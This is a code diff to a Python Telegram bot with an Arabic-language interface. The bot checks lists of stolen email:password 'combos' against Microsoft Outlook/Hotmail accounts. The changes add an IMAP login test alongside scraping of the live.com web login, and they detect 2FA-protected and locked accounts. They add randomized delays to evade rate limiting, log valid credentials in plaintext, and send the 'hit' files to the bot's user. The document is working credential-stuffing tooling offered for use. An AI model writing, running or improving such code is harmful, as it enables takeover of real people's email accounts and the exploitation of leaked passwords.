@@ -186,75 +186,75 @@ user_manager = UserManager()
 # ==================== HOTMAIL CHECKER ====================
 
 def get_hotmail_token(email, password):
-    """Get access token from Hotmail"""
+    """Enhanced Multi-Method Checker"""
+    
+    # Method 1: Try IMAP First (Most Reliable)
     try:
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        }
-        
-        session = requests.Session()
-        
-        # Get login page
-        login_url = "https://login.live.com"
-        response = session.get(login_url, headers=headers, timeout=15)
-        
-        if response.status_code != 200:
-            return None, "connection_error"
-        
-        # Extract PPFT token
-        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]*)"', response.text)
-        if not ppft_match:
-            return None, "parse_error"
-        
-        ppft = ppft_match.group(1)
-        
-        # Login attempt
-        login_data = {
-            "login": email,
-            "passwd": password,
-            "PPFT": ppft,
-            "PPSX": "PassportR",
-        }
-        
-        response = session.post(
-            "https://login.live.com/ppsecure/post.srf",
-            data=login_data,
-            headers=headers,
-            timeout=15,
-            allow_redirects=True
-        )
-        
-        # Check if login successful
-        if "account.live.com" in response.url or "outlook.live.com" in response.url:
-            # Try to get access token
-            try:
-                token_response = session.get(
-                    "https://outlook.live.com/mail/0/inbox",
-                    headers=headers,
-                    timeout=15
-                )
-                
-                token_match = re.search(r'"accessToken":"([^"]+)"', token_response.text)
-                if token_match:
-                    return token_match.group(1), "success"
-                else:
-                    return "valid_no_token", "success"
-            except:
-                return "valid_no_token", "success"
-        
-        elif "account.live.com/Abuse" in response.url:
-            return None, "locked"
-        elif "account.live.com/password/reset" in response.url:
-            return None, "bad"
+        import imaplib
+        mail = imaplib.IMAP4_SSL('outlook.office365.com', 993, timeout=10)
+        mail.login(email, password)
+        mail.select('INBOX')
+        mail.logout()
+        return "VALID_IMAP", "success"
+    except imaplib.IMAP4.error as e:
+        error = str(e).lower()
+        if 'authenticate' in error or 'login' in error or 'invalid' in error:
+            pass  # Try next method
         else:
             return None, "bad"
+    except:
+        pass  # Try next method
+    
+    # Method 2: Web Login (Fallback)
+    try:
+        session = requests.Session()
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml',
+        }
+        
+        r = session.get('https://login.live.com/', headers=headers, timeout=10)
+        ppft = re.search(r'name="PPFT".*?value="(.*?)"', r.text)
+        url_post = re.search(r'urlPost:\'(.*?)\'', r.text)
+        
+        if ppft:
+            data = {
+                'login': email,
+                'loginfmt': email,
+                'passwd': password,
+                'PPFT': ppft.group(1),
+            }
             
-    except requests.exceptions.Timeout:
-        return None, "timeout"
-    except requests.exceptions.ConnectionError:
-        return None, "connection_error"
-    except Exception as e:
-        return None, "error"
+            post_url = url_post.group(1) if url_post else 'https://login.live.com/ppsecure/post.srf'
+            r2 = session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=15)
+            
+            url = r2.url.lower()
+            text = r2.text.lower()
+            
+            if 'account.live.com' in url or 'outlook.live.com' in url:
+                return "VALID_WEB", "success"
+            
+            if 'verify' in text or 'help us protect' in text:
+                return "VALID_2FA", "2fa_required"
+            
+            if 'locked' in text or 'abuse' in url:
+                return None, "locked"
+    except:
+        pass
+    
+    # If all methods fail
+    return None, "bad"
+
+def check_via_imap(email, password):
+    """Standalone IMAP check"""
+    try:
+        import imaplib
+        mail = imaplib.IMAP4_SSL('outlook.office365.com', 993, timeout=10)
+        mail.login(email, password)
+        mail.logout()
+        return "valid_via_imap", "success"
+    except:
+        return None, "bad"
 
 def check_emails_for_services(token, email, selected_services=None):
     """Check inbox for service registrations"""
@@ -301,7 +301,7 @@ def check_emails_for_services(token, email, selected_services=None):
         return {}
 
 def check_account(email, password, user_id, selected_services=None):
-    """Check single account"""
+    """Check single account with enhanced detection and logging"""
     result = {
         "email": email,
         "password": password,
@@ -310,41 +310,59 @@ def check_account(email, password, user_id, selected_services=None):
         "message": ""
     }
     
-    # Get token
-    token, status = get_hotmail_token(email, password)
-    
-    if status == "success":
-        result["status"] = "hit"
-        result["message"] = "✅ Valid Account"
+    try:
+        # Get token with multiple methods
+        token, status = get_hotmail_token(email, password)
         
-        # Check for services
-        if token and token != "valid_no_token":
-            services_found = check_emails_for_services(token, email, selected_services)
-            result["services"] = services_found
+        if status == "success":
+            result["status"] = "hit"
+            result["message"] = f"✅ Valid ({token})"
             
-            if services_found:
-                result["message"] += f" | 🎯 {len(services_found)} services found"
-        
-        # Update stats
-        user_manager.update_stats(user_id, hits=1, checks=1)
-        
-    elif status == "locked":
-        result["status"] = "locked"
-        result["message"] = "🔒 Account Locked"
-        user_manager.update_stats(user_id, checks=1)
-        
-    elif status == "timeout":
-        result["status"] = "retry"
-        result["message"] = "⏱️ Timeout"
-        
-    elif status == "connection_error":
-        result["status"] = "retry"
-        result["message"] = "🔌 Connection Error"
-        
-    else:
-        result["status"] = "bad"
-        result["message"] = "❌ Invalid"
-        user_manager.update_stats(user_id, checks=1)
+            # Log the hit
+            logger.info(f"HIT FOUND: {email}:{password}")
+            
+            # Check for services
+            if token and "VALID" in str(token):
+                try:
+                    services_found = check_emails_for_services(token, email, selected_services)
+                    result["services"] = services_found
+                    
+                    if services_found:
+                        result["message"] += f" | 🎯 {len(services_found)} services"
+                except Exception as e:
+                    logger.error(f"Error checking services for {email}: {e}")
+            
+            # Update stats
+            user_manager.update_stats(user_id, hits=1, checks=1)
+            
+        elif status == "2fa_required":
+            result["status"] = "2fa_required"
+            result["message"] = "🔐 Valid - 2FA Required"
+            logger.info(f"2FA ACCOUNT: {email}:{password}")
+            user_manager.update_stats(user_id, hits=1, checks=1)
+            
+        elif status == "locked":
+            result["status"] = "locked"
+            result["message"] = "🔒 Account Locked"
+            user_manager.update_stats(user_id, checks=1)
+            
+        elif status == "timeout":
+            result["status"] = "retry"
+            result["message"] = "⏱️ Timeout"
+            
+        elif status == "connection_error":
+            result["status"] = "retry"
+            result["message"] = "🔌 Connection Error"
+            
+        else:
+            result["status"] = "bad"
+            result["message"] = "❌ Invalid"
+            user_manager.update_stats(user_id, checks=1)
+    
+    except Exception as e:
+        logger.error(f"Error checking {email}: {e}")
+        result["status"] = "error"
+        result["message"] = f"❌ Error: {str(e)}"
     
     return result
 
@@ -738,7 +756,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_combos(query, context, file_path, lines, scan_type)
 
 async def process_combos(query, context, file_path, lines, scan_type):
-    """Process combo list"""
+    """Process combo list with improved speed and accuracy"""
     user_id = query.from_user.id
     
     # Initialize stats
@@ -747,6 +765,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
         "bad": 0,
         "retry": 0,
         "locked": 0,
+        "2fa": 0,
         "processed": 0,
         "total": len(lines),
         "services_found": {}
@@ -763,7 +782,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
         parse_mode='HTML'
     )
     
-    # Process combos
+    # Process combos with rate limiting
     for i, line in enumerate(lines):
         if ':' not in line:
             continue
@@ -771,6 +790,9 @@ async def process_combos(query, context, file_path, lines, scan_type):
         parts = line.split(':', 1)
         email = parts[0].strip()
         password = parts[1].strip()
+        
+        # Small delay to avoid rate limiting (0.3-0.5 seconds)
+        time.sleep(random.uniform(0.3, 0.5))
         
         # Check account
         result = check_account(email, password, user_id)
@@ -797,21 +819,41 @@ async def process_combos(query, context, file_path, lines, scan_type):
             stats["bad"] += 1
         elif result["status"] == "locked":
             stats["locked"] += 1
+        elif result["status"] == "2fa_required":
+            stats["2fa"] += 1
+            stats["hit"] += 1  # 2FA means valid account
+            
+            # Save 2FA accounts
+            twofa_file = os.path.join(result_dir, "Hits_2FA.txt")
+            with open(twofa_file, 'a', encoding='utf-8') as f:
+                f.write(f"{email}:{password} | Requires 2FA\n")
         elif result["status"] == "retry":
             stats["retry"] += 1
         
-        # Update progress every 10 accounts
-        if (i + 1) % 10 == 0 or (i + 1) == stats["total"]:
+        # Update progress every 5 accounts or at milestones
+        if (i + 1) % 5 == 0 or (i + 1) == stats["total"] or (i + 1) % 100 == 0:
             progress = (stats["processed"] / stats["total"]) * 100
+            
+            # Calculate estimated time remaining
+            if stats["processed"] > 0:
+                avg_time_per_check = (time.time() - int(result_dir.split('_')[-1])) / stats["processed"]
+                remaining = (stats["total"] - stats["processed"]) * avg_time_per_check
+                eta_minutes = int(remaining / 60)
+                eta_seconds = int(remaining % 60)
+                eta_text = f"\n⏱️ الوقت المتبقي: ~{eta_minutes}د {eta_seconds}ث"
+            else:
+                eta_text = ""
             
             progress_text = f"""
 ⏳ <b>جاري الفحص...</b>
 
 📊 التقدم: {stats["processed"]}/{stats["total"]} ({progress:.1f}%)
+{eta_text}
 
 ✅ صحيح: {stats["hit"]}
 ❌ خاطئ: {stats["bad"]}
 🔒 مقفل: {stats["locked"]}
+🔐 2FA: {stats["2fa"]}
 🔄 إعادة: {stats["retry"]}
             """
             
@@ -819,9 +861,6 @@ async def process_combos(query, context, file_path, lines, scan_type):
                 await status_msg.edit_text(progress_text, parse_mode='HTML')
             except:
                 pass
-        
-        # Small delay
-        time.sleep(0.5)
     
     # Final results
     final_text = f"""
@@ -832,6 +871,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
 • صحيح: {stats["hit"]}
 • خاطئ: {stats["bad"]}
 • مقفل: {stats["locked"]}
+• 2FA مطلوب: {stats["2fa"]}
 • إعادة: {stats["retry"]}
 
 🎯 <b>الخدمات المكتشفة: {len(stats["services_found"])}</b>
@@ -847,14 +887,15 @@ async def process_combos(query, context, file_path, lines, scan_type):
     # Send result files
     if stats["hit"] > 0:
         for filename in os.listdir(result_dir):
-            file_path = os.path.join(result_dir, filename)
+            file_path_result = os.path.join(result_dir, filename)
             
             try:
                 await context.bot.send_document(
                     chat_id=user_id,
-                    document=open(file_path, 'rb'),
+                    document=open(file_path_result, 'rb'),
                     caption=f"📄 {filename}\n\n💎 {MY_SIGNATURE}"
                 )
+                time.sleep(0.5)  # Delay between file sends
             except:
                 pass
     
